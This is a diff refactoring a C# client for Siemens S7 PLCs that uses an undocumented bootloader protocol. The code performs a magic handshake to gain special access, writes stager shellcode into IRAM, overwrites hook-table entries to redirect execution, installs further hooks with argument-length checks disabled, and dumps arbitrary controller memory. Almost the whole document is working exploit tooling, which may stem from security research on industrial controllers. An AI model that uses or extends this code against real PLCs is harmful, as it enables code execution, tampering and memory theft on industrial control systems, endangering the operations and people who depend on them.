@@ -7,6 +7,7 @@ using System.IO;
 using System.Text;
 using System.Diagnostics;
 using System.Threading;
+using Microsoft.Extensions.Logging;
 
 namespace S7.Net
 {
@@ -14,13 +15,24 @@ namespace S7.Net
     /// The main client for communicating with Siemens S7 PLCs using the undocumented bootloader protocol.
     /// Provides methods for handshake, stager installation, memory operations, and payload management.
     /// </summary>
-    public sealed class PlcClient(ICommunicationChannel channel, Action<string> logger)
+    public sealed class PlcClient : IDisposable
     {
-        private readonly ICommunicationChannel _channel = channel ?? throw new ArgumentNullException(nameof(channel));
-        private readonly PlcProtocol _protocol = new(channel ?? throw new ArgumentNullException(nameof(channel)),
-                                                     logger ?? throw new ArgumentNullException(nameof(logger)));
-        private readonly Action<string> _log = logger ?? throw new ArgumentNullException(nameof(logger));
+        private readonly ICommunicationChannel _channel;
+        private readonly PlcProtocol _protocol;
+        private readonly ILogger<PlcClient> _logger;
         private uint _nextPayloadLocation = PlcConstants.DUMPER_PAYLOAD_LOCATION;
+        private bool _disposed;
+
+        /// <summary>
+        /// Initializes a new instance of the <see cref="PlcClient"/> class.
+        /// </summary>
+        public PlcClient(ICommunicationChannel channel, ILoggerFactory loggerFactory)
+        {
+            if (loggerFactory == null) throw new ArgumentNullException(nameof(loggerFactory));
+            _channel = channel ?? throw new ArgumentNullException(nameof(channel));
+            _logger = loggerFactory.CreateLogger<PlcClient>();
+            _protocol = new PlcProtocol(channel, loggerFactory.CreateLogger<PlcProtocol>());
+        }
 
         /// <summary>
         /// Indicates whether the client is connected to the PLC.
@@ -40,11 +52,6 @@ namespace S7.Net
         /// <summary>
         /// Invokes a primary handler on the PLC.
         /// </summary>
-        /// <param name="handlerIndex">The index of the handler to invoke.</param>
-        /// <param name="args">The arguments to pass to the handler.</param>
-        /// <param name="awaitResponse">Whether to wait for a response.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
         public async Task<byte[]?> InvokePrimaryHandler(byte handlerIndex, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -59,8 +66,8 @@ namespace S7.Net
             }
             catch (ChecksumMismatchException ex)
             {
-                _log($"[ERROR] Checksum mismatch in response to handler 0x{handlerIndex:X2}: {ex.Message}");
-                return null;
+                _logger.LogError(ex, "Checksum mismatch in response to handler 0x{HandlerIndex:X2}", handlerIndex);
+                throw; // Re-throw the exception
             }
         }
 
@@ -68,14 +75,12 @@ namespace S7.Net
         /// <summary>
         /// Performs the initial handshake to gain special access to the PLC.
         /// </summary>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        /// <returns>True if the handshake was successful, false otherwise.</returns>
         public async Task<bool> PerformHandshakeAsync(CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log("Starting handshake...");
-            byte[] magic = Encoding.ASCII.GetBytes("MFGT1");
-            byte[] padding = Encoding.ASCII.GetBytes("AAAA");
+            _logger.LogInformation("Starting handshake...");
+            byte[] magic = Encoding.ASCII.GetBytes(PlcConstants.HANDSHAKE_MAGIC);
+            byte[] padding = Encoding.ASCII.GetBytes(PlcConstants.HANDSHAKE_PADDING);
             var handshakePayload = padding.Concat(magic).ToArray();
 
             for (int attempt = 0; attempt < 100; attempt++)
@@ -84,7 +89,7 @@ namespace S7.Net
                 await _protocol.RawWriteAsync(handshakePayload, 0, handshakePayload.Length, cancellationToken);
                 var sw = Stopwatch.StartNew();
                 var responseBuffer = new System.Collections.Generic.List<byte>();
-                while (sw.ElapsedMilliseconds < 300)
+                while (sw.ElapsedMilliseconds < PlcConstants.HANDSHAKE_TIMEOUT_MS)
                 {
                     cancellationToken.ThrowIfCancellationRequested();
                     if (_protocol.DataAvailable)
@@ -95,47 +100,43 @@ namespace S7.Net
                         {
                             responseBuffer.AddRange(tmpBuf.Take(bytesRead));
                             var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
-                            _log($"Handshake attempt {attempt + 1}: buf={BitConverter.ToString(responseBuffer.ToArray())} ASCII={ascii}");
-                            if (ascii.Contains("-CPU"))
+                            _logger.LogDebug("Handshake attempt {Attempt}: buf={Buffer} ASCII={Ascii}", attempt + 1, BitConverter.ToString(responseBuffer.ToArray()), ascii);
+                            if (ascii.Contains(PlcConstants.HANDSHAKE_SUCCESS_SIGNATURE))
                             {
-                                _log("Handshake successful: Found -CPU signature!");
+                                _logger.LogInformation("Handshake successful: Found -CPU signature!");
                                 return true;
                             }
                         }
                     }
-                    await Task.Delay(50, cancellationToken);
+                    await Task.Delay(PlcConstants.HANDSHAKE_POLL_DELAY_MS, cancellationToken);
                 }
-                // Final buffer check after silence
                 if (responseBuffer.Count > 0)
                 {
                     var ascii = Encoding.ASCII.GetString(responseBuffer.ToArray());
-                    _log($"Handshake final buf={BitConverter.ToString(responseBuffer.ToArray())} ASCII={ascii}");
-                    if (ascii.Contains("-CPU"))
+                    _logger.LogDebug("Handshake final buf={Buffer} ASCII={Ascii}", BitConverter.ToString(responseBuffer.ToArray()), ascii);
+                    if (ascii.Contains(PlcConstants.HANDSHAKE_SUCCESS_SIGNATURE))
                     {
-                        _log("Handshake successful (after silence): Found -CPU signature!");
+                        _logger.LogInformation("Handshake successful (after silence): Found -CPU signature!");
                         return true;
                     }
                 }
-                await Task.Delay(10, cancellationToken); // brief pause before retry
+                await Task.Delay(PlcConstants.HANDSHAKE_RETRY_DELAY_MS, cancellationToken);
             }
-            _log("Handshake failed.");
+            _logger.LogWarning("Handshake failed.");
             return false;
         }
 
         /// <summary>
         /// Gets the version of the PLC bootloader.
         /// </summary>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        /// <returns>The version string.</returns>
         public async Task<string> GetVersion(CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log("Getting bootloader version...");
-            var response = await InvokePrimaryHandler(0, Array.Empty<byte>(), true, cancellationToken);
-            if (response is null) throw new Exception("Failed to get version.");
-            _log($"[VERSION RAW HEX] {BitConverter.ToString(response)}");
-            _log($"[VERSION RAW ASCII] {Encoding.ASCII.GetString(response)}");
-            // Look for V as prefix, then take next three bytes
+            _logger.LogInformation("Getting bootloader version...");
+            var response = await InvokePrimaryHandler(PlcConstants.HANDLER_GET_VERSION, Array.Empty<byte>(), true, cancellationToken);
+            if (response is null) throw new Exception("Failed to get version due to a communication error (likely a checksum mismatch).");
+            _logger.LogDebug("[VERSION RAW HEX] {Hex}", BitConverter.ToString(response));
+            _logger.LogDebug("[VERSION RAW ASCII] {Ascii}", Encoding.ASCII.GetString(response));
             int idxV = Array.IndexOf(response, (byte)'V');
             string version = "(invalid)";
             if (idxV >= 0 && response.Length >= idxV + 4)
@@ -144,29 +145,26 @@ namespace S7.Net
             }
             else if (response.Length >= 6)
             {
-                // fallback: manually use offset 2 as that's where V appears in typical bootloader
                 version = $"{(char)response[2]}{response[3]}.{response[4]}.{response[5]}";
             }
-            _log($"Got version: {version}");
+            _logger.LogInformation("Got version: {Version}", version);
             return version;
         }
 
         /// <summary>
         /// Enters a subprotocol mode.
         /// </summary>
-        /// <param name="mode">The mode to enter.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         private async Task EnterSubprotocol(int mode, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log($"Entering subprotocol mode {mode}...");
+            _logger.LogInformation("Entering subprotocol mode {Mode}...", mode);
             ushort magic = PlcConstants.SUBPROT_80_MODE_MAGICS[mode];
             byte[] payload = BitConverter.GetBytes(magic);
-            if (BitConverter.IsLittleEndian) Array.Reverse(payload); // Make big-endian
-            var response = await InvokePrimaryHandler(0x80, payload, true, cancellationToken);
+            if (BitConverter.IsLittleEndian) Array.Reverse(payload);
+            var response = await InvokePrimaryHandler(PlcConstants.HANDLER_ENTER_SUBPROTOCOL, payload, true, cancellationToken);
             if (response == null || !response.SequenceEqual(PlcConstants.ANSW_ENTER_SUBPROTO_SUCCESS))
                 throw new Exception("Failed to enter subprotocol.");
-            _log("Entered subprotocol successfully.");
+            _logger.LogInformation("Entered subprotocol successfully.");
         }
 
         /// <summary>
@@ -175,34 +173,30 @@ namespace S7.Net
         private async Task LeaveSubprotocol(CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log("Leaving subprotocol...");
-            await _protocol.SendPacketAsync(new byte[] { 0x81, 0xD0, 0x67 }, cancellationToken: cancellationToken);
+            _logger.LogInformation("Leaving subprotocol...");
+            await _protocol.SendPacketAsync(PlcConstants.CMD_LEAVE_SUBPROTOCOL, cancellationToken: cancellationToken);
             try
             {
                 await _protocol.ReceivePacketAsync(cancellationToken);
             }
             catch (ChecksumMismatchException ex)
             {
-                _log($"[ERROR] Checksum mismatch while leaving subprotocol: {ex.Message}");
+                _logger.LogError(ex, "Checksum mismatch while leaving subprotocol.");
+                throw;
             }
         }
 
         /// <summary>
         /// Writes data to the PLC in subprotocol mode.
         /// </summary>
-        /// <param name="address">The address to write to.</param>
-        /// <param name="data">The data to write.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         private async Task RawSubprotocolWrite(uint address, byte[] data, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            var payload = new byte[7 + data.Length];
-            payload[0] = 0x84;
-            payload[1] = 0x5a;
-            payload[2] = 0x2e;
+            var payload = new byte[PlcConstants.CMD_RAW_WRITE_PREFIX.Length + 4 + data.Length];
+            Array.Copy(PlcConstants.CMD_RAW_WRITE_PREFIX, 0, payload, 0, PlcConstants.CMD_RAW_WRITE_PREFIX.Length);
             var addrBytes = GetBigEndianBytes(address);
-            Array.Copy(addrBytes, 0, payload, 3, 4);
-            Array.Copy(data, 0, payload, 7, data.Length);
+            Array.Copy(addrBytes, 0, payload, PlcConstants.CMD_RAW_WRITE_PREFIX.Length, 4);
+            Array.Copy(data, 0, payload, PlcConstants.CMD_RAW_WRITE_PREFIX.Length + 4, data.Length);
 
             await _protocol.SendPacketAsync(payload, cancellationToken: cancellationToken);
             try
@@ -211,81 +205,68 @@ namespace S7.Net
             }
             catch (ChecksumMismatchException ex)
             {
-                _log($"[ERROR] Checksum mismatch in response to RawSubprotocolWrite: {ex.Message}");
+                _logger.LogError(ex, "Checksum mismatch in response to RawSubprotocolWrite.");
+                throw;
             }
         }
 
         /// <summary>
         /// Writes a chunk of data to IRAM.
         /// </summary>
-        /// <param name="targetAddress">The target address in IRAM.</param>
-        /// <param name="contents">The data to write.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         private async Task WriteChunkToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
         {
-            uint targetArgument = targetAddress - 0x10000000;
-            // 1. Mask with 0xFF bytes
+            uint targetArgument = targetAddress - PlcConstants.IRAM_ADDRESS_OFFSET;
             await RawSubprotocolWrite(targetArgument, Enumerable.Repeat((byte)0xFF, contents.Length).ToArray(), cancellationToken);
-            // 2. Write actual contents
             await RawSubprotocolWrite(targetArgument, contents, cancellationToken);
         }
 
         /// <summary>
         /// Writes data to IRAM.
         /// </summary>
-        /// <param name="targetAddress">The target address in IRAM.</param>
-        /// <param name="contents">The data to write.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         public async Task WriteToIram(uint targetAddress, byte[] contents, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log($"Writing {contents.Length} bytes to IRAM at 0x{targetAddress:X8}");
+            _logger.LogInformation("Writing {Length} bytes to IRAM at 0x{TargetAddress:X8}", contents.Length, targetAddress);
             await EnterSubprotocol(PlcConstants.SUBPROT_80_MODE_IRAM, cancellationToken);
 
-            int chunkSize = 16; // From python script
-            for (int i = 0; i < contents.Length; i += chunkSize)
+            for (int i = 0; i < contents.Length; i += PlcConstants.IRAM_WRITE_CHUNK_SIZE)
             {
                 cancellationToken.ThrowIfCancellationRequested();
-                int size = Math.Min(chunkSize, contents.Length - i);
+                int size = Math.Min(PlcConstants.IRAM_WRITE_CHUNK_SIZE, contents.Length - i);
                 var chunk = new byte[size];
                 Array.Copy(contents, i, chunk, 0, size);
-                _log($"Writing chunk {i / chunkSize + 1}...");
+                _logger.LogDebug("Writing chunk {ChunkNumber}...", i / PlcConstants.IRAM_WRITE_CHUNK_SIZE + 1);
                 await WriteChunkToIram(targetAddress + (uint)i, chunk, cancellationToken);
             }
 
             await LeaveSubprotocol(cancellationToken);
-            _log("Finished writing to IRAM.");
+            _logger.LogInformation("Finished writing to IRAM.");
         }
 
         /// <summary>
         /// Installs the stager payload onto the PLC.
         /// </summary>
-        /// <param name="stagerPayload">The stager payload to install.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         public async Task InstallStager(byte[] stagerPayload, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            _log("Starting stager installation...");
-            // 1. Write stager shellcode to its location in IRAM
+            _logger.LogInformation("Starting stager installation...");
             await WriteToIram(PlcConstants.IRAM_STAGER_START, stagerPayload, cancellationToken);
 
-            // 2. Overwrite an entry in the hook table to point to our stager
-            _log("Overwriting hook table entry...");
+            _logger.LogInformation("Overwriting hook table entry...");
             var hookEntryPayload = new byte[6];
-            hookEntryPayload[0] = 0x00; // Arg length check part 1
-            hookEntryPayload[1] = 0xFF; // Arg length check part 2 (0x00FF = variable length)
+            hookEntryPayload[0] = PlcConstants.STAGER_HOOK_VAR_LEN_ARG_1;
+            hookEntryPayload[1] = PlcConstants.STAGER_HOOK_VAR_LEN_ARG_2;
 
-            // Pointer to the stager code (big-endian)
             var addrBytes = GetBigEndianBytes(PlcConstants.IRAM_STAGER_START);
             Array.Copy(addrBytes, 0, hookEntryPayload, 2, 4);
 
             await WriteToIram(PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2, hookEntryPayload);
 
-            _log("Stager installation complete.");
-            _log($"[PROTOCOL] ✅ Stager installed at hook index 0x{PlcConstants.DEFAULT_STAGER_ADDHOOK_IND:X2}");
-            _log($"[PROTOCOL] Hook table address: 0x{PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2:X8}");
-            _log($"[PROTOCOL] Stager code address: 0x{PlcConstants.IRAM_STAGER_START:X8}");
-            _log("[PROTOCOL] 🎯 Stager is ready for use");
+            _logger.LogInformation("Stager installation complete.");
+            _logger.LogInformation("[PROTOCOL] Stager installed at hook index 0x{HookIndex:X2}", PlcConstants.DEFAULT_STAGER_ADDHOOK_IND);
+            _logger.LogInformation("[PROTOCOL] Hook table address: 0x{Address:X8}", PlcConstants.ADD_HOOK_TABLE_START + 8 * PlcConstants.DEFAULT_STAGER_ADDHOOK_IND + 2);
+            _logger.LogInformation("[PROTOCOL] Stager code address: 0x{Address:X8}", PlcConstants.IRAM_STAGER_START);
+            _logger.LogInformation("[PROTOCOL] Stager is ready for use");
         }
         #endregion
 
@@ -293,8 +274,6 @@ namespace S7.Net
         /// <summary>
         /// Encodes a packet for transmission via the stager.
         /// </summary>
-        /// <param name="chunk">The chunk to encode.</param>
-        /// <returns>The encoded packet.</returns>
         private byte[] EncodePacketForStager(byte[] chunk)
         {
             for (int i = 1; i < 256; i++)
@@ -319,11 +298,6 @@ namespace S7.Net
         /// <summary>
         /// Sends a full message via the stager.
         /// </summary>
-        /// <param name="msg">The message to send.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        // The maxChunkSize (189) and the call to SendPacketAsync with a step of 8 and
-        // a sleep of 10ms are consistent with the Python client's
-        // `send_full_msg_via_stager` and `write_via_stager` functions.
         public async Task SendFullMsgViaStager(byte[] msg, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -331,18 +305,17 @@ namespace S7.Net
             for (int i = 0; i < msg.Length; i += maxChunkSize)
             {
                 cancellationToken.ThrowIfCancellationRequested();
-                // Add safety delay between chunks (matches Python SEND_REQ_SAFETY_SLEEP_AMT)
                 await Task.Delay(10, cancellationToken);
 
                 int size = Math.Min(maxChunkSize, msg.Length - i);
                 var chunk = new byte[size];
                 Array.Copy(msg, i, chunk, 0, size);
 
-                _log($"[BYTES] Send progress: 0x{i:X6}/0x{msg.Length:X6} ({(float)i / msg.Length:P2})");
+                _logger.LogDebug("[BYTES] Send progress: 0x{Progress:X6}/0x{Total:X6} ({Percent:P2})", i, msg.Length, (float)i / msg.Length);
                 var encoded = EncodePacketForStager(chunk);
-                _log($"[BYTES] Encoded chunk (with XOR key): {BitConverter.ToString(encoded)}");
+                _logger.LogTrace("[BYTES] Encoded chunk (with XOR key): {Chunk}", BitConverter.ToString(encoded));
                 await _protocol.SendPacketAsync(encoded, 8, 10, cancellationToken);
-                _log($"[BYTES] Chunk sent at offset {i}. Awaiting ACK...");
+                _logger.LogDebug("[BYTES] Chunk sent at offset {Offset}. Awaiting ACK...", i);
 
                 byte[]? ack = null;
                 try
@@ -351,26 +324,25 @@ namespace S7.Net
                 }
                 catch (ChecksumMismatchException ex)
                 {
-                    _log($"[ERROR] Checksum mismatch while waiting for ACK from stager: {ex.Message}");
+                    _logger.LogError(ex, "Checksum mismatch while waiting for ACK from stager.");
                     throw;
                 }
                 if (ack == null || ack.Length != 1)
                 {
-                    _log($"[BYTES][ERROR] Expected single-byte ACK, got: {(ack != null ? BitConverter.ToString(ack) : "<null>")}");
+                    _logger.LogError("[BYTES] Expected single-byte ACK, got: {Ack}", ack != null ? BitConverter.ToString(ack) : "<null>");
                     throw new Exception($"Did not receive expected empty ACK from stager at chunk offset {i}");
                 }
 
                 byte ackValue = ack[0];
-                _log($"[BYTES][ACK] Value received: 0x{ackValue:X2}");
-                if (ackValue == 0xFF)
+                _logger.LogDebug("[BYTES][ACK] Value received: 0x{AckValue:X2}", ackValue);
+                if (ackValue == PlcConstants.STAGER_INTERRUPT_ACK)
                 {
-                    _log("[BYTES][WARNING] Received interrupt ACK (0xFF). Aborting.");
+                    _logger.LogWarning("[BYTES] Received interrupt ACK (0xFF). Aborting.");
                     throw new Exception("Interrupt ACK (0xFF)");
                 }
             }
-            // Send empty packet to signify end of transmission
             var endPacket = EncodePacketForStager(Array.Empty<byte>());
-            _log($"[BYTES] Sending end packet: {BitConverter.ToString(endPacket)}");
+            _logger.LogTrace("[BYTES] Sending end packet: {Packet}", BitConverter.ToString(endPacket));
             await _protocol.SendPacketAsync(endPacket, cancellationToken: cancellationToken);
             byte[]? finalAck = null;
             try
@@ -379,19 +351,15 @@ namespace S7.Net
             }
             catch (ChecksumMismatchException ex)
             {
-                _log($"[ERROR] Checksum mismatch while waiting for final ACK from stager: {ex.Message}");
+                _logger.LogError(ex, "Checksum mismatch while waiting for final ACK from stager.");
+                throw;
             }
-            _log($"[BYTES] Received end packet ACK (length={finalAck?.Length ?? -1}): {(finalAck != null ? BitConverter.ToString(finalAck) : "<null>")}");
+            _logger.LogDebug("[BYTES] Received end packet ACK (length={Length}): {Ack}", finalAck?.Length ?? -1, finalAck != null ? BitConverter.ToString(finalAck) : "<null>");
         }
 
         /// <summary>
         /// Invokes an additional hook on the PLC.
         /// </summary>
-        /// <param name="hookNo">The hook number to invoke.</param>
-        /// <param name="args">The arguments to pass to the hook.</param>
-        /// <param name="awaitResponse">Whether to wait for a response.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        /// <returns>The response from the PLC, or null if no response was awaited.</returns>
         public async Task<byte[]?> InvokeAddHook(int hookNo, byte[] args, bool awaitResponse = true, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -402,15 +370,12 @@ namespace S7.Net
             payload[0] = (byte)hookNo;
             Array.Copy(args, 0, payload, 1, args.Length);
 
-            return await InvokePrimaryHandler(0x1c, payload, awaitResponse, cancellationToken);
+            return await InvokePrimaryHandler(PlcConstants.HANDLER_INVOKE_ADD_HOOK, payload, awaitResponse, cancellationToken);
         }
 
         /// <summary>
         /// Writes data to the PLC via the stager.
         /// </summary>
-        /// <param name="address">The address to write to.</param>
-        /// <param name="contents">The data to write.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         public async Task WriteViaStager(uint address, byte[] contents, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -422,32 +387,23 @@ namespace S7.Net
         /// <summary>
         /// Installs an additional hook via the stager.
         /// </summary>
-        /// <param name="targetAddress">The target address of the new hook.</param>
-        /// <param name="payload">The payload of the new hook.</param>
-        /// <param name="newHookNo">The new hook number.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
         public async Task InstallAddHookViaStager(uint targetAddress, byte[] payload, int newHookNo, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
-            // Set up function pointer and disable arbitrary argument length check
             var hookEntry = new byte[8];
-            hookEntry[3] = 0xff; // Variable length
+            hookEntry[3] = 0xff;
             hookEntry[4] = (byte)(targetAddress >> 24);
             hookEntry[5] = (byte)(targetAddress >> 16);
             hookEntry[6] = (byte)(targetAddress >> 8);
             hookEntry[7] = (byte)targetAddress;
             await WriteViaStager(PlcConstants.ADD_HOOK_TABLE_START + (uint)(8 * newHookNo), hookEntry, cancellationToken);
 
-            // Write the code of the handler itself
             await WriteViaStager(targetAddress, payload, cancellationToken);
         }
 
         /// <summary>
         /// Receives a large amount of data from the PLC.
         /// </summary>
-        /// <param name="progress">The progress reporter.</param>
-        /// <param name="cancellationToken">The cancellation token.</param>
-        /// <returns>The received data.</returns>
         public async Task<byte[]> ReceiveMany(IProgress<long> progress, CancellationToken cancellationToken = default)
         {
             if (_protocol is null) throw new InvalidOperationException("Not connected.");
@@ -463,10 +419,8 @@ namespace S7.Net
                     }
                     catch (ChecksumMismatchException ex)
                     {
-                        _log($"[ERROR] Checksum mismatch during ReceiveMany: {ex.Message}");
-                        // Optionally, we could break or rethrow here depending on desired behavior.
-                        // For now, we'll just log and continue, which might result in incomplete data.
-                        continue;
+                        _logger.LogError(ex, "Checksum mismatch during ReceiveMany.");
+                        throw;
                     }
                     if (chunk == null || chunk.Length == 0)
                     {
@@ -485,22 +439,20 @@ namespace S7.Net
 
             cancellationToken.ThrowIfCancellationRequested();
 
-            _log("Installing memory dumper payload...");
+            _logger.LogInformation("Installing memory dumper payload...");
             await InstallAddHookViaStager(_nextPayloadLocation, dumpMemPayload, PlcConstants.DEFAULT_SECOND_ADD_HOOK_IND, cancellationToken);
             _nextPayloadLocation += (uint)dumpMemPayload.Length;
-            // Align to next 4-byte boundary
             if (_nextPayloadLocation % 4 != 0)
             {
                 _nextPayloadLocation = _nextPayloadLocation - (_nextPayloadLocation % 4) + 4;
             }
-            _log("Memory dumper payload installed.");
+            _logger.LogInformation("Memory dumper payload installed.");
 
             cancellationToken.ThrowIfCancellationRequested();
 
-            _log($"Requesting memory dump of {length} bytes from 0x{address:X8}...");
-            // Prepare arguments: "A" + address + length
+            _logger.LogInformation("Requesting memory dump of {Length} bytes from 0x{Address:X8}...", length, address);
             var args = new byte[1 + 4 + 4];
-            args[0] = (byte)'A';
+            args[0] = PlcConstants.DUMP_COMMAND_START_BYTE;
             var addrBytes = GetBigEndianBytes(address);
             var lenBytes = GetBigEndianBytes(length);
             Array.Copy(addrBytes, 0, args, 1, 4);
@@ -516,11 +468,19 @@ namespace S7.Net
 
             cancellationToken.ThrowIfCancellationRequested();
 
-            _log("Memory dump started. Receiving data...");
+            _logger.LogInformation("Memory dump started. Receiving data...");
             var data = await ReceiveMany(progress, cancellationToken);
-            _log($"Memory dump complete. Received {data.Length} bytes.");
+            _logger.LogInformation("Memory dump complete. Received {Length} bytes.", data.Length);
             return data;
         }
         #endregion
+
+        public void Dispose()
+        {
+            if (_disposed) return;
+            // The creator of the PlcClient is responsible for disposing the channel.
+            // The channel is injected, so we don't dispose it here.
+            _disposed = true;
+        }
     }
 }
